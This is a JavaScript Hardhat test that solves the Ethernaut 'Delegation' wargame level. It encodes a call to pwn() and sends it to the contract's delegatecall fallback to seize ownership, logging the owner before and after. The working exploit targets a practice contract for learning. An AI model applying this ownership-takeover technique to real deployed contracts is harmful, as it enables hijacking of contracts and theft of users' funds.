const { expect } = require("chai");
const { Contract, Signer } = require("ethers");
const { keccak256 } = require("ethers/lib/utils");
const { ethers, waffle } = require("hardhat");
const {
  createChallenge,
  submitLevel,
  ETHERNAUT_ABI,
  ETHERNAUT_ADDRESS,
} = require("./utils");

const abi = [
  {
    inputs: [
      { internalType: "address", name: "_delegateAddress", type: "address" },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  { stateMutability: "nonpayable", type: "fallback" },
  {
    inputs: [],
    name: "owner",
    outputs: [{ internalType: "address", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x8da5cb5b",
  },
];

const delegateAbi = [
  {
    inputs: [
      {
        internalType: "address",
        name: "_owner",
        type: "address",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "pwn",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const contractLevel = "0xd4e6B977d9Dea283797AaD71a09eC65DfdAc98f5";

before(async () => {
  [eoa] = await ethers.getSigners();
  challengeAddress = await createChallenge(
    contractLevel,
    0,
    "DelegationFactory"
  );
  //   const artifact = await artifacts.readArtifact("Fal1out");
  challenge = new ethers.Contract(challengeAddress, abi, eoa);
  console.log(`eoa address: ${JSON.stringify(eoa.address)}`);
});

it("solves the challenge", async () => {
  // Callfallback function of Delegation contract with msg.data
  // that targets the pwn() function.
  const delegateInterface = new ethers.utils.Interface(delegateAbi);
  let encodedData = delegateInterface.encodeFunctionData("pwn");
  console.log(`encodedData: ${JSON.stringify(encodedData)}`);
  let contractOwner = await challenge.owner();
  console.log(`contractOwner: ${JSON.stringify(contractOwner)}`);
  let tx = await eoa.sendTransaction({
    to: challengeAddress,
    data: encodedData,
    gasLimit: 30000000,
  });
  tx.wait(1);
  contractOwner = await challenge.owner();
  console.log(`contractOwner: ${JSON.stringify(contractOwner)}`);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
